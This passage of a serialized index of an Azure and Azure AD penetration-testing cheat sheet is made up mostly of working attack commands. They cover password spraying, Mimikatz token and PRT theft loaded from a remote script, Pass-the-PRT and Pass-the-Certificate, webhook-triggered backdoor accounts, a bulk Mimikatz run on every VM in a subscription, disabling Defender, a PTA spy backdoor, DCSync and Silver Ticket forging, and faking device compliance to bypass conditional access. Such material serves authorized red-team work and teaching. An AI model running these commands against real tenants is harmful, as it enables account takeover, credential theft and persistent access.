$password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password) PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>' Spawn SSH for Azure Web App az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME> Azure Storage Blob Blobs - *.blob.core.windows.net File Services - *.file.core.windows.net Data Tables - *.table.core.windows.net Queues - *.queue.core.windows.net Enumerate blobs PS > . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureBlobs.ps1 PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt Found Storage Account - testsecure.blob.core.windows.net Found Storage Account - securetest.blob.core.windows.net Found Storage Account - securedata.blob.core.windows.net Found Storage Account - securefiles.blob.core.windows.net SAS URL Use Storage Explorer Click on Open Connect Dialog in the left menu. Select Blob container . On the Select Authentication Method page Select Shared access signature (SAS) and click on Next Copy the URL in Blob container SAS URL field. :warning: You can also use subscription (username/password) to access storage resources such as blobs and files. List and download blobs PS Az> Get-AzResource PS Az> Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME> PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob Runbook Automation Create a Runbook # Check user right for automation az extension add --upgrade -n automation az automation account list # if it doesn't return anything the user is not a part of an Automation group az ad signed-in-user list-owned-objects # If the user is not part of an \"Automation\" group. # Add him to a custom group , e.g: \"Automation Admins\" Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose # Get the role of a user on the Automation account # Contributor or higher = Can create and execute Runbooks Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT> # List hybrid workers Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> # Create a Powershell Runbook PS C:\\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\\Tools\\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose # Publish the Runbook Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose # Start the Runbook Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose Persistence via Automation accounts Create a new Automation Account \"Create Azure Run As account\": Yes Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* Sample runbook for this Blog located here \u2013 https://github.com/NetSPI/MicroBurst Publish the runbook Add a webhook to the runbook Add the AzureAD module to the Automation account Update the Azure Automation Modules Assign \"User Administrator\" and \"Subscription Owner\" rights to the automation account Eventually lose your access\u2026 Trigger the webhook with a post request to create the new user powershell $uri = \"https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d\" $AccountInfo = @(@{RequestBody=@{Username=\"BackdoorUsername\";Password=\"BackdoorPassword\"}}) $body = ConvertTo-Json -InputObject $AccountInfo $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body Virtual Machine RunCommand Requirements: * Microsoft.Compute/virtualMachines/runCommand/action # Get Public IP of VM : query the network interface PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368> PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP> # Execute Powershell script on the VM PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\Tools\\adduser.ps1' -Verbose # Connect via WinRM PS C:\\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force PS C:\\Tools> $creds = New-Object System.Management.Automation.PSCredential('username', $Password) PS C:\\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) PS C:\\Tools> Enter-PSSession $sess Allow anyone with \"Contributor\" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\\System # List available VMs PS C:\\> Get-AzureRmVM -status | where {$_.PowerState -EQ \"VM running\"} | select ResourceGroupName,Name ResourceGroupName Name ----------------- ---- TESTRESOURCES Remote-Test # Execute Powershell script on the VM PS C:\\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1 Against the whole subscription using MicroBurst.ps1 Import-module MicroBurst.psm1 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt KeyVault Secrets # keyvault access token curl \"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER # connect PS> $token = 'eyJ0..' PS> $keyvaulttoken = 'eyJ0..' PS Az> Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken # query the vault and the secrets PS Az> Get-AzKeyVault PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText Pass The PRT MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on). # Run mimikatz to obtain the PRT PS> iex (New-Object Net.Webclient).downloadstring(\"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1\") PS> Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::cloudap\"' # Copy the PRT and KeyValue Mimikatz> privilege::debug Mimikatz> token::elevate Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect # Copy the Context, ClearKey and DerivedKey Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT> # Generate a JWT PS> Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals> $PRT_OF_USER = '...' PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += \"=\"} PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER)) PS AADInternals> $ClearKey = \"XXYYZZ...\" PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne '')) PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey \u2013GetNonce eyJ0eXAiOiJKV1QiL... The <Signed JWT> (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf. Edit the Chrome cookie (F12) -> Application -> Cookies with the values: Name: x-ms-RefreshTokenCredential Value: <Signed JWT> HttpOnly: \u221a :warning: Mark the cookie with the flags HTTPOnly and Secure . Pass The Certificate Copy-Item -ToSession $jumpvm -Path C:\\Tools\\PrtToCertmaster.zip -Destination C:\\Users\\Username\\Documents\\username \u2013Verbose Expand-Archive -Path C:\\Users\\Username\\Documents\\username\\PrtToCert-master.zip -DestinationPath C:\\Users\\Username\\Documents\\username\\PrtToCert # Require the PRT, TenantID, Context and DerivedKey & 'C:\\Program Files\\Python39\\python.exe' C:\\Users\\Username\\Documents\\username\\PrtToCert\\RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY> # PFX saved with the name <Username>@<TENANT NAME>.onmicrosoft.com.pfx and password AzureADCert Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine https://github.com/morRubin/AzureADJoinedMachinePTC Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP Main.py --usercert \"admin.pfx\" --certpass password --remoteip 10.10.10.10 python Main.py --usercert C:\\Users\\Username\\Documents\\username\\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx -- certpass AzureADCert --remoteip 10.10.10.10 --command \"cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add\" Intunes Administration Requirements: * Global Administrator or Intune Administrator Privilege : Get-AzureADGroup -Filter \"DisplayName eq 'Intune Administrators'\" Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT Go to Devices -> All Devices to check devices enrolled to Intune Go to Scripts and click on Add for Windows 10. Add a Powershell script Specify Add all users and Add all devices in the Assignments page. :warning: It will take up to one hour before you script is executed ! Dynamic Group Membership Get groups that allow Dynamic membership: Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} Rule example : (user.otherMails -any (_ -contains \"vendor\")) -and (user.userType -eq \"guest\") Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group Open user's profile, click on Manage Click on Resend invite and to get an invitation URL Set the secondary email powershell PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose Administrative Unit Administrative Unit can reset password of another user PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID> PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID> PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId> PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl PS C:\\Tools> $password = \"Password\" | ConvertToSecureString -AsPlainText -Force PS C:\\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq \"<Username>@<TENANT NAME>.onmicrosoft.com\"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose Deployment Template PS Az> Get-AzResourceGroup PS Az> Get-AzResourceGroupDeployment -ResourceGroupName SAP # Export PS Az> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME> cat <DEPLOYMENT NAME>.json # search for hardcoded password cat <PATH TO .json FILE> | Select-String password Application Proxy # Enumerate application that have Proxy PS C:\\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}} PS C:\\Tools> Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq \"Finance Management System\"} PS C:\\Tools> . C:\\Tools\\GetApplicationProxyAssignedUsersAndGroups.ps1 PS C:\\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID> Conditional Access Bypassing conditional access by copying User-Agent (Chrome Dev Tool > Select iPad Pro, etc) Bypassing conditional access by faking device compliance powershell # AAD Internals - Making your device compliant # Get an access token for AAD join and save to cache Get-AADIntAccessTokenForAADJoin -SaveToCache # Join the device to Azure AD Join-AADIntDeviceToAzureAD -DeviceName \"SixByFour\" -DeviceType \"Commodore\" -OSVersion \"C64\" # Marking device compliant - option 1: Registering device to Intune # Get an access token for Intune MDM and save to cache (prompts for credentials) Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache # Join the device to Intune Join-AADIntDeviceToIntune -DeviceName \"SixByFour\" # Start the call back Start-AADIntDeviceIntuneCallback -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName \"SixByFour\" Azure AD With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD. Authenticate to your webmail portal (i.e. https://webmail.domain.com/) Change your browser URL to: https://azure.microsoft.com/ Pick the account from the active sessions Select Azure Active Directory and enjoy! Azure AD vs Active Directory Active Directory Azure AD LDAP REST API'S NTLM/Kerberos OAuth/SAML/OpenID Structured directory (OU tree) Flat structure GPO No GPO's Super fine-tuned access controls Predefined roles Domain/forest Tenant Trusts Guests Password Hash Syncronization (PHS) Passwords from on-premise AD are sent to the cloud Use replication via a service account created by AD Connect Pass Through Authentication (PTA) Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text Connect Windows Server AD to Azure AD using Federation Server (ADFS) Dir-Sync : Handled by on-premise Windows Server AD, sync username/password Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large Password Spray Default lockout policy of 10 failed attempts, locking out an account for 60 seconds git clone https://github.com/dafthack/MSOLSpray Import-Module .\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020 Invoke-MSOLSpray -UserList .\\users.txt -Password d0ntSprayme! # UserList - UserList file filled with usernames one-per-line in the format \"user@domain.com\" # Password - A single password that will be used to perform the password spray. # OutFile - A file to output valid results to. # Force - Forces the spray to continue and not stop when multiple account lockouts are detected. # URL - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from. Convert GUID to SID The user's AAD id is translated to SID by concatenating \"S-1\u201312\u20131-\" to the decimal representation of each section of the AAD Id. GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)] SID: S-1\u201312\u20131-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)] For example, the representation of 6aa89ecb-1f8f-4d92\u2013810d-b0dce30b6c82 is S-1\u201312\u20131\u20131789435595\u20131301421967\u20133702525313\u20132188119011 Azure AD Connect Check if Azure AD Connect is installed : Get-ADSyncConnector For PHS , we can extract the credentials For PTA , we can install the agent For Federation , we can extract the certificate from ADFS server using DA PS > Set-MpPreference -DisableRealtimeMonitoring $true PS > Copy-Item -ToSession $adcnct -Path C:\\Tools\\AADInternals.0.4.5.zip -Destination C:\\Users\\Administrator\\Documents PS > Expand-Archive C:\\Users\\Administrator\\Documents\\AADInternals.0.4.5.zip -DestinationPath C:\\Users\\Administrator\\Documents\\AADInternals PS > Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\AADInternals.psd1 PS > Get-AADIntSyncCredentials # Get Token for SYNC account and reset on-prem admin password PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force PS > $creds = New-Object System.Management.Automation.PSCredential (\"<Username>@<TenantName>.onmicrosoft.com\", $passwd) PS > GetAADIntAccessTokenForAADGraph -Credentials $creds \u2013SaveToCache PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId PS > Set-AADIntUserPassword -SourceAnchor \"<IMMUTABLE-ID>\" -Password \"Password\" -Verbose Check if PTA is installed : Get-Command -Module PassthroughAuthPSModule Install a PTA Backdoor powershell PS AADInternals> Install-AADIntPTASpy PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords Azure AD Connect - Password extraction Credentials in AD Sync : C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf Tool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes git clone https://github.com/fox-it/adconnectdump # DCSync with AD Sync account Azure AD Connect - MSOL Account's password and DCSync You can perform DCSync attack using the MSOL account. Requirements: * Compromise a server with Azure AD Connect service * Access to ADSyncAdmins or local Administrators groups Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account: * azuread_decrypt_msol.ps1 : AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 * azuread_decrypt_msol_v2.ps1 : Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack. Azure AD Connect - Seamless Single Sign On Silver Ticket Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA) Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD. :warning: The password of the AZUREADSSOACC account never changes. Using https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 & Azure NTLM password hash of the AZUREADSSOACC account, e.g. f9969e088b2c13d93833d0ce436c76dd . powershell mimikatz.exe \"lsadump::dcsync /user:AZUREADSSOACC$\" exit AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com . This is typically either his userPrincipalName or mail attribute from the on-prem AD. SID of the user we want to impersonate, e.g. S-1-5-21-2121516926-2695913149-3163778339-1234 . Create the Silver Ticket and inject it into Kerberos cache: powershell mimikatz.exe \"kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\" exit Launch Mozilla Firefox Go to about:config and set the network.negotiate-auth.trusted-uris preference to value https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty. References Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !! Pass-the-PRT attack and detection by Microsoft Defender for \u2026 - Derk van der Woude - Jun 9 Azure AD Pass The Certificate - Mor - Aug 19, 2020 Get Access Tokens for Managed Service Identity on Azure App Service Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen An introduction to penetration testing Azure - Graceful Security Running Powershell scripts on Azure VM - Netspi Attacking Azure Cloud shell - Netspi Maintaining Azure Persistence via automation accounts - Netspi Detecting an attacks on active directory with Azure - Smartspate Azure AD Overview Windows Azure Active Directory in plain English Building Free Active Directory Lab in Azure - @kamran.bilgrami Attacking Azure/Azure AD and introducing Powerzure - SpecterOps Azure AD connect for RedTeam - @xpnsec Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020 Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020 Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020 AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhi\u00e8re (bak) - 2020-04-20 Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter The Art of the Device Code Phish - Bobby Cooke AZURE AD cheatsheet - BlackWasp","title":"Azure Active Directory"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-active-directory","text":"","title":"Azure Active Directory"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#summary","text":"Azure Recon Tools Terminology Enumeration Enumerate valid emails Enumerate Azure Subdomains Enumerate tenant with Azure AD Powershell Enumerate tenant with Az Powershell Enumerate tenant with az cli Enumerate manually Enumeration methodology Phishing with Evilginx2 Illicit Consent Grant Register Application Configure Application Setup 365-Stealer (Deprecated) Setup Vajra Device Code Phish Token from Managed Identity Azure API via Powershell Azure API via Python Version Get Tokens Use Tokens Refresh Tokens Stealing Tokens Stealing tokens from az cli Stealing tokens from az powershell Add Credentials to All Enterprise Applications Spawn SSH for Azure Web App Azure Storage Blob Enumerate blobs SAS URL List and download blobs Runbook Automation Create a Runbook Persistence via Automation accounts Virtual Machine RunCommand KeyVault Secrets Pass The Certificate Pass The PRT Intunes Administration Dynamic Group Membership Administrative Unit Deployment Template Application Proxy Conditional Access Azure AD Azure AD vs Active Directory Password Spray Convert GUID to SID Azure AD Connect Azure AD Connect - Password extraction Azure AD Connect - MSOL Account's password and DCSync Azure AD Connect - Seamless Single Sign On Silver Ticket References","title":"Summary"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-recon-tools","text":"ROADTool powershell pipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] roadrecon auth -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD> roadrecon gather roadrecon gui StormSpotter ```powershell # https://github.com/Azure/Stormspotter","title":"Azure Recon Tools"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#session-1-backend","text":"pipenv shell python ssbackend.pyz","title":"session 1 - backend"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#session-2-frontend","text":"cd C:\\Tools\\stormspotter\\frontend\\dist\\spa\\ quasar.cmd serve -p 9091 --history","title":"session 2 - frontend"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#session-3-collector","text":"pipenv shell az login -u test@ .onmicrosoft.com -p python C:\\Tools\\stormspotter\\stormcollector\\sscollector.pyz cli","title":"session 3 - collector"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#web-access-on-httplocalhost9091","text":"Username: neo4j Password: BloodHound Server: bolt://localhost:7687 * **Azure Hound** powershell","title":"Web access on http://localhost:9091"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#httpsgithubcombloodhoundadazurehound","text":". C:\\Tools\\AzureHound\\AzureHound.ps1 Invoke-AzureHound -Verbose","title":"https://github.com/BloodHoundAD/AzureHound"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#gui-access","text":"bolt://localhost:7687 Username: neo4j Password: BloodHound","title":"GUI access"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#cypher-query-example","text":"MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p","title":"Cypher query example:"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#change-object-ids-to-names-in-bloodhound","text":"MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> \"\" AND n.name IS NULL SET n.name = n.azname","title":"Change object ID's to names in Bloodhound"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#custom-queries-httpshauseccom20201123azurehound-cypher-cheatsheet","text":"* List of Microsoft portals: https://msportals.io/ * **Azucar** : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks. powershell","title":"Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#you-should-use-an-account-with-at-least-read-permission-on-the-assets-you-want-to-access","text":"git clone https://github.com/nccgroup/azucar.git PS> Get-ChildItem -Recurse c:\\Azucar_V10 | Unblock-File PS> .\\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT PS> .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 PS> .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000","title":"You should use an account with at least read-permission on the assets you want to access"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#resolve-the-tenantid-for-an-specific-username","text":"PS> .\\Azucar.ps1 -ResolveTenantUserName user@company.com * **Azurite Explorer** and **Azurite Visualizer** : Enumeration and reconnaissance activities in the Microsoft Azure Cloud. powershell git clone https://github.com/mwrlabs/Azurite.git git clone https://github.com/FSecureLABS/Azurite git submodule init git submodule update PS> Import-Module AzureRM PS> Import-Module AzuriteExplorer.ps1 PS> Review-AzureRmSubscription PS> Review-CustomAzureRmSubscription * **MicroBurst** - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping powershell $ git clone https://github.com/NetSPI/MicroBurst PS C:> Import-Module .\\MicroBurst.psm1 PS C:> Import-Module .\\Get-AzureDomainInfo.ps1 PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose ``` * SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins. Require: - Read-Only permissions over Azure Directory (Tenant) - Read-Only permissions over Subscription - Require AZ and AzureAD module or administrator right ```powershell $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C> Import-Module .\\SkyArk.ps1 -force PS C> Start-AzureStealth or in the Cloud Console PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1') PS C> Scan-AzureAdmins PowerZure * - ```powershell require az module ! $ git clone https://github.com/hausec/PowerZure $ ipmo .\\PowerZure $ Set-Subscription -Id [idgoeshere]","title":"resolve the TenantID for an specific username"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#reader","text":"$ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails","title":"Reader"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#contributor","text":"$ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command \"whoami\" $ Execute-MSBuild -VM Win10Test -ResourceGroup Test-RG -File \"build.xml\" $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk","title":"Contributor"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#owner","text":"$ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest","title":"Owner"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#administrator","text":"$ Create-Backdoor, Execute-Backdoor ```","title":"Administrator"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#terminology","text":"Basic Azure AD terminologies Tenant : An instance of Azure AD and represents a single organization. Azure AD Directory : Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources. Subscriptions : It is used to pay for services. There can be multiple subscriptions in a Directory. Core Domain : The initial domain name .onmicrosoft.com is the core domain. It is possible to define custom domain names too.","title":"Terminology"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumeration","text":"","title":"Enumeration"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-valid-emails","text":"By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute. Validate email powershell PS> C:\\Python27\\python.exe C:\\Tools\\o365creeper\\o365creeper.py -f C:\\Tools\\emails.txt -o C:\\Tools\\validemails.txt admin@<TENANT NAME>.onmicrosoft.com - VALID root@<TENANT NAME>.onmicrosoft.com - INVALID test@<TENANT NAME>.onmicrosoft.com - VALID contact@<TENANT NAME>.onmicrosoft.com - INVALID Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon","title":"Enumerate valid emails"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#password-spraying","text":"PS> . C:\\Tools\\MSOLSpray\\MSOLSpray.ps1 PS> Invoke-MSOLSpray -UserList C:\\Tools\\validemails.txt -Password <PASSWORD> -Verbose","title":"Password spraying"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-azure-subdomains","text":"PS> . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureSubDomains.ps1 PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose Subdomain Service --------- ------- <TENANT NAME>.mail.protection.outlook.com Email <TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain","title":"Enumerate Azure Subdomains"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-tenant-with-azure-ad-powershell","text":"Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 Import-Module C:\\Tools\\AzureADPreview\\AzureADPreview.psd1 PS> $passwd = ConvertTo-SecureString \"<PASSWORD>\" -AsPlainText -Force PS> $creds = New-Object System.Management.Automation.PSCredential(\"test@<TENANT NAME>.onmicrosoft.com\", $passwd) PS Az> Connect-AzureAD -Credential $creds PS AzureAD> Get-AzureADUser -All $true PS AzureAD> Get-AzureADUser -All $true | select UserPrincipalName PS AzureAD> Get-AzureADGroup -All $true PS AzureAD> Get-AzureADDevice PS AzureAD> Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Administrator'\" | Get-AzureADDirectoryRoleMember PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName","title":"Enumerate tenant with Azure AD 